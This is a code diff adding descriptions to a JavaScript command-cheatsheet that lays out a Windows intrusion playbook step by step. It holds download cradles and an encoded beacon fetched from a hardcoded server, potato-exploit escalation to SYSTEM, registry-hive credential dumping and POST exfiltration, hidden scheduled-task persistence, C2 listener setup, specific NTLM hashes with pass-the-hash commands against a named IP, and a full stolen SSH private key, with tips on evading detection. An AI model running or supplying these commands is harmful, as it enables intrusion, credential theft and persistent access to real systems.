@@ -2745,60 +2745,70 @@ const COMMANDS = [
   // ═══════════════════════════════════════════════════════════════
   {
     title: "[CHAIN-1] Check SeImpersonate Privilege",
+    desc: "FIRST STEP. If SeImpersonate shows Enabled, you can escalate to SYSTEM using Potato exploits. Common on IIS/SQL service accounts.",
     code: "whoami /priv | findstr SeImpersonate",
     tags: ["cmd", "privesc", "recon", "playbook"],
     accent: "#9b59b6"
   },
   {
     title: "[CHAIN-2] Download PrintSpoofer",
+    desc: "Download PrintSpoofer to target. Must have HTTP server running on VPS:8889 with PrintSpoofer.exe in served directory.",
     code: "IWR -Uri 'http://168.144.166.97:8889/PrintSpoofer.exe' -OutFile C:\\\\Windows\\\\Temp\\\\ps.exe -UseBasicParsing",
     tags: ["ps", "privesc", "c2", "playbook"],
     accent: "#9b59b6"
   },
   {
     title: "[CHAIN-3] Download GodPotato",
+    desc: "Alternative to PrintSpoofer. GodPotato works on more Windows versions. Use -cmd flag instead of -c.",
     code: "IWR -Uri 'http://168.144.166.97:8889/GodPotato.exe' -OutFile C:\\\\Windows\\\\Temp\\\\gp.exe -UseBasicParsing",
     tags: ["ps", "privesc", "c2", "playbook"],
     accent: "#9b59b6"
   },
   {
     title: "[CHAIN-4] Encode Beacon for -enc",
+    desc: "Converts beacon download cradle to Base64 for -enc flag. Avoids quote issues. Copy output and paste into CHAIN-5.",
     code: "$cmd = 'IEX(IWR http://168.144.166.97:8889/beacon.ps1 -UseBasicParsing)'; [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))",
     tags: ["ps", "privesc", "c2", "playbook"],
     accent: "#9b59b6"
   },
   {
     title: "[CHAIN-5] PrintSpoofer to SYSTEM",
+    desc: "Execute encoded beacon as SYSTEM. Base64 string is pre-encoded beacon cradle. New session appears in C2 as NT AUTHORITY\\SYSTEM.",
     code: "C:\\\\Windows\\\\Temp\\\\ps.exe -c \"powershell -ep bypass -w hidden -enc SQBFAFgAKABJAFcAUgAgAGgAdAB0AHAAOgAvAC8AMQA2ADgALgAxADQANAAuADEANgA2AC4AOQA3ADoAOAA4ADgAOQAvAGIAZQBhAGMAbwBuAC4AcABzADEAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkA\"",
     tags: ["cmd", "privesc", "c2", "playbook"],
     accent: "#9b59b6"
   },
   {
     title: "[CHAIN-5-ALT] GodPotato to SYSTEM",
+    desc: "Same as PrintSpoofer but uses GodPotato. Note: uses -cmd flag not -c. Works on newer Windows versions.",
     code: "C:\\\\Windows\\\\Temp\\\\gp.exe -cmd \"powershell -ep bypass -w hidden -enc SQBFAFgAKABJAFcAUgAgAGgAdAB0AHAAOgAvAC8AMQA2ADgALgAxADQANAAuADEANgA2AC4AOQA3ADoAOAA4ADgAOQAvAGIAZQBhAGMAbwBuAC4AcABzADEAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkA\"",
     tags: ["cmd", "privesc", "c2", "playbook"],
     accent: "#9b59b6"
   },
   {
     title: "[CHAIN-6] Dump SAM/SYSTEM/SECURITY",
+    desc: "Run as SYSTEM. Saves registry hives containing password hashes. Need both SAM and SYSTEM to crack. SECURITY has LSA secrets.",
     code: "reg save HKLM\\\\SAM C:\\\\Windows\\\\Temp\\\\sam\\nreg save HKLM\\\\SYSTEM C:\\\\Windows\\\\Temp\\\\sys\\nreg save HKLM\\\\SECURITY C:\\\\Windows\\\\Temp\\\\sec",
     tags: ["cmd", "postexploit", "playbook"],
     accent: "#ff9800"
   },
   {
     title: "[CHAIN-7] Exfil SAM to VPS",
+    desc: "POST SAM hive to VPS receiver (catch_all.py on port 8083). File saves to /keys/ directory on VPS.",
     code: "$s = [IO.File]::ReadAllBytes('C:\\\\Windows\\\\Temp\\\\sam'); IRM -Uri 'http://168.144.166.97:8083/sam' -Method POST -Body $s",
     tags: ["ps", "postexploit", "c2", "playbook"],
     accent: "#ff6b35"
   },
   {
     title: "[CHAIN-8] Exfil SYSTEM to VPS",
+    desc: "POST SYSTEM hive. REQUIRED for cracking - contains BOOTKEY to decrypt SAM. Without this, SAM alone is useless.",
     code: "$s = [IO.File]::ReadAllBytes('C:\\\\Windows\\\\Temp\\\\sys'); IRM -Uri 'http://168.144.166.97:8083/system' -Method POST -Body $s",
     tags: ["ps", "postexploit", "c2", "playbook"],
     accent: "#ff6b35"
   },
   {
     title: "[CHAIN-9] SYSTEM Persistence (Survives Reboot)",
+    desc: "Creates scheduled task running as SYSTEM on boot. Beacon auto-connects when machine restarts. Check with 'schtasks /query /tn Updater'.",
     code: "schtasks /create /tn \"Updater\" /tr \"powershell -w hidden -ep bypass IEX(IWR http://168.144.166.97:8889/beacon.ps1 -UseBasicParsing)\" /sc onstart /ru SYSTEM /f",
     tags: ["cmd", "persist", "playbook"],
     accent: "#e74c3c"
@@ -2808,36 +2818,42 @@ const COMMANDS = [
   // ═══════════════════════════════════════════════════════════════
   {
     title: "VPS: Start C2 Listener (4444)",
+    desc: "Start multi-session C2 handler. Beacons connect here. Use 'sessions' to list, 'use N' to interact, 'bg' to background.",
     code: "cd /root && python3 c2_multi_v2.py",
     tags: ["linux", "vps", "c2", "playbook"],
     accent: "#00ff41"
   },
   {
     title: "VPS: Start HTTP Server (8889)",
+    desc: "Serves files to targets (beacon.ps1, PrintSpoofer, GodPotato). Must be in /opt directory. Targets download from here.",
     code: "cd /opt && python3 -m http.server 8889",
     tags: ["linux", "vps", "c2", "playbook"],
     accent: "#00ff41"
   },
   {
     title: "VPS: Start Exfil Receiver (8083)",
+    desc: "Catches POST requests from targets. Saves to /keys/ directory. Used for SAM/SYSTEM/SSH key exfiltration.",
     code: "cd /opt && python3 catch_all.py",
     tags: ["linux", "vps", "c2", "playbook"],
     accent: "#00ff41"
   },
   {
     title: "VPS: Copy Beacon to HTTP Dir",
+    desc: "Beacon file must be in HTTP server directory (/opt). If missing, target gets 404 and beacon fails.",
     code: "cp /beacon_persistent.ps1 /opt/beacon.ps1",
     tags: ["linux", "vps", "c2"],
     accent: "#00ff41"
   },
   {
     title: "VPS: Download Potato Tools",
+    desc: "Download PrintSpoofer and GodPotato from GitHub releases. Places them in /opt for HTTP server to serve.",
     code: "cd /opt\\nwget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe -O PrintSpoofer.exe\\nwget https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe -O GodPotato.exe",
     tags: ["linux", "vps", "privesc"],
     accent: "#00ff41"
   },
   {
     title: "VPS: Check All Listeners",
+    desc: "Verify all services running. Should see: 4444 (C2), 8083 (exfil), 8889 (HTTP). If missing, start the service.",
     code: "ss -tlnp | grep -E '4444|8080|8083|8889'",
     tags: ["linux", "vps", "recon"],
     accent: "#00ff41"
@@ -2847,24 +2863,28 @@ const COMMANDS = [
   // ═══════════════════════════════════════════════════════════════
   {
     title: "[HASH] adminvm1 (RID 500 - Local Admin)",
+    desc: "NTLM hash for adminvm1. RID 500 = built-in Administrator. Use for PTH without cracking. Format: :NTHASH for impacket.",
     code: "a4840a9c4a6828c0d5b5dbfa3bc567b0",
     tags: ["hash", "postexploit"],
     accent: "#ffeb3b"
   },
   {
     title: "[HASH] trainer (RID 1000)",
+    desc: "NTLM hash for trainer account. RID 1000+ = user-created accounts. May have different privileges than admin.",
     code: "996d8424607cc98092971283e3ac5b1c",
     tags: ["hash", "postexploit"],
     accent: "#ffeb3b"
   },
   {
     title: "[HASH] alsadmin (RID 1001)",
+    desc: "NTLM hash for alsadmin. 'admin' in name suggests admin privileges. Try PTH if adminvm1 blocked.",
     code: "ff81519803d67ea2c41a2c40b70010e0",
     tags: ["hash", "postexploit"],
     accent: "#ffeb3b"
   },
   {
     title: "[HASH] psycho (RID 1002)",
+    desc: "NTLM hash for psycho account. Standard user, may have limited access. Good for lateral if main accounts monitored.",
     code: "ab4f5a5c42df5a0ee337d12ce77332f5",
     tags: ["hash", "postexploit"],
     accent: "#ffeb3b"
@@ -2874,36 +2894,42 @@ const COMMANDS = [
   // ═══════════════════════════════════════════════════════════════
   {
     title: "[PTH] WMIExec as adminvm1",
+    desc: "Pass-the-hash via WMI. Semi-interactive shell. Stealthier than PSExec - no service installed. Requires port 135 open.",
     code: "impacket-wmiexec -hashes :a4840a9c4a6828c0d5b5dbfa3bc567b0 adminvm1@4.200.69.210",
     tags: ["linux", "vps", "lateral", "playbook"],
     accent: "#00ff41"
   },
   {
     title: "[PTH] WMIExec as trainer",
+    desc: "PTH as trainer account. May have lower privileges. Use if admin accounts are locked/monitored.",
     code: "impacket-wmiexec -hashes :996d8424607cc98092971283e3ac5b1c trainer@4.200.69.210",
     tags: ["linux", "vps", "lateral"],
     accent: "#00ff41"
   },
   {
     title: "[PTH] WMIExec as alsadmin",
+    desc: "PTH as alsadmin. Try different accounts if one gets blocked by EDR or AV.",
     code: "impacket-wmiexec -hashes :ff81519803d67ea2c41a2c40b70010e0 alsadmin@4.200.69.210",
     tags: ["linux", "vps", "lateral"],
     accent: "#00ff41"
   },
   {
     title: "[PTH] WMIExec as psycho",
+    desc: "PTH as psycho user. Standard account for low-profile access.",
     code: "impacket-wmiexec -hashes :ab4f5a5c42df5a0ee337d12ce77332f5 psycho@4.200.69.210",
     tags: ["linux", "vps", "lateral"],
     accent: "#00ff41"
   },
   {
     title: "[PTH] SMBExec (stealthier)",
+    desc: "PTH via SMB shares. No binary dropped on disk. Creates service but removes it after. Requires SMB (445) open.",
     code: "impacket-smbexec -hashes :a4840a9c4a6828c0d5b5dbfa3bc567b0 adminvm1@4.200.69.210",
     tags: ["linux", "vps", "lateral"],
     accent: "#00ff41"
   },
   {
     title: "[PTH] PSExec (gives SYSTEM)",
+    desc: "PTH via PSExec - drops service binary, gives SYSTEM shell. LOUD - creates Event 7045. Use when stealth not required.",
     code: "python3 -m impacket.examples.psexec -hashes :a4840a9c4a6828c0d5b5dbfa3bc567b0 adminvm1@4.200.69.210",
     tags: ["linux", "vps", "lateral", "privesc"],
     accent: "#00ff41"
@@ -2913,12 +2939,14 @@ const COMMANDS = [
   // ═══════════════════════════════════════════════════════════════
   {
     title: "[SSH] Stolen adminvm1 Private Key",
+    desc: "Ed25519 private key exfiltrated from target. Permanent access - doesn't expire like passwords. Save to file, chmod 600.",
     code: "-----BEGIN OPENSSH PRIVATE KEY-----\\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW\\nQyNTUxOQAAACC+zsAC/N/Oyd2AvzNT5qHsYRGS/D8jVKp/YJyjXs0W0wAAAKAp2h95Kdof\\neQAAAAtzc2gtZWQyNTUxOQAAACC+zsAC/N/Oyd2AvzNT5qHsYRGS/D8jVKp/YJyjXs0W0w\\nAAAECb3VTMV+jfBsJsjEqrwaJhR+XI45LE0cg1glq5l9tW8b7OwAL8387J3YC/M1Pmoexh\\nEZL8PyNUqn9gnKNezRbTAAAAF2FkbWludm0xQENlcnRJVkN5YmVyTGFiAQIDBAUG\\n-----END OPENSSH PRIVATE KEY-----",
     tags: ["ssh", "persist", "lateral"],
     accent: "#e74c3c"
   },
   {
     title: "[SSH] Save Key and Connect",
+    desc: "One-liner: saves key to ~/.ssh/, sets permissions, connects. Run on VPS. Works as long as key is in target's authorized_keys.",
     code: "echo '-----BEGIN OPENSSH PRIVATE KEY-----\\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW\\nQyNTUxOQAAACC+zsAC/N/Oyd2AvzNT5qHsYRGS/D8jVKp/YJyjXs0W0wAAAKAp2h95Kdof\\neQAAAAtzc2gtZWQyNTUxOQAAACC+zsAC/N/Oyd2AvzNT5qHsYRGS/D8jVKp/YJyjXs0W0w\\nAAAECb3VTMV+jfBsJsjEqrwaJhR+XI45LE0cg1glq5l9tW8b7OwAL8387J3YC/M1Pmoexh\\nEZL8PyNUqn9gnKNezRbTAAAAF2FkbWludm0xQENlcnRJVkN5YmVyTGFiAQIDBAUG\\n-----END OPENSSH PRIVATE KEY-----' > ~/.ssh/cloudlabs_key && chmod 600 ~/.ssh/cloudlabs_key && ssh -i ~/.ssh/cloudlabs_key adminvm1@4.200.69.210",
     tags: ["linux", "vps", "lateral", "playbook"],
     accent: "#00ff41"
